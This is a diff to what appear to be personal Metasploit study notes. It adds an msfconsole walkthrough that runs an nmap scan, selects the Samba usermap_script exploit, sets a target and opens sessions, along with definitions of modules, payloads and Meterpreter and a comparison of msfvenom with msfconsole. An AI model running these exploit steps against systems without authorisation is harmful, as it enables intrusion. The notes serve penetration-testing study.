@@ -75,16 +75,48 @@ $ back
 ---
 $ nmap <ip> -sV
 $ search name:samba type:exploit platform:unix
-$ use <Exploits Name>
+$ use <Exploits Name>(exploit/multi/samba/usermap_script)
 $ show options
 $ set RHOSTS <ip>
 $ show options
 $ exploit # WOW
-$ sessions -h
-$ sessions -l
+$ Ctrl + Z # Background Session
+$ sessions -h # Help
+$ sessions -l # List of Session
+$ sessions -u 1  # Use the session that have running in background
+$ sessions -k 1 # To Kill the Session
+
+# Optional Alternatively, keep the existing handler and change your exploit's listener port:
+$ set LPORT 4445
+$ exploit
 ```
 
 ---
 
 ### Payload Types
-- Single, Staged or Stages, Stages, MeterPreter, PassiveX, NoNX, Ord, IPv^ 
+
+- Single, Staged or Stages, Stages, MeterPreter, PassiveX, NoNX, Ord, IPv^
+
+---
+
+## New
+
+- **Core Concepts**
+  - _Modules_ : Separate components tha perform one job, such as exploiting a vulnerability, scanning a service, or performing post-exploitation.
+  - _Payloads_ : The code that runs on a target after an exploit succeeds. payloads can be simple shells or advanced interactive agents.
+  - _Meterpreter_: A common interactive payload that provides many built-in capabilities for file access, running commands, and gathering information.
+  - _Handle or Listener_ : A component that waits for a payload to connect back to the tester so the session can be controlled.
+  - _Database and workspace_ : Storage that lets testers keep scan results, notes, and session data organized and repeatable
+
+```bash
+  $ show exploits
+  $ show payloads
+  $ show post
+  $ show encoders
+```
+
+## Difference between msfvenom and msfconsole
+
+- **msfvenom** : A payload generator. It builds payload files or code snippets that will run on a target. Think of it as the payload production tool.
+- **msfconsole** : The main framework interface and operational environment. It loads modules, manages exploits, and acts as the listener or handler that interacts with payloads when they connect back
+- **Simple memory aid** : msfvenom produces the payload. msfconsole runs the framework and manages sessions
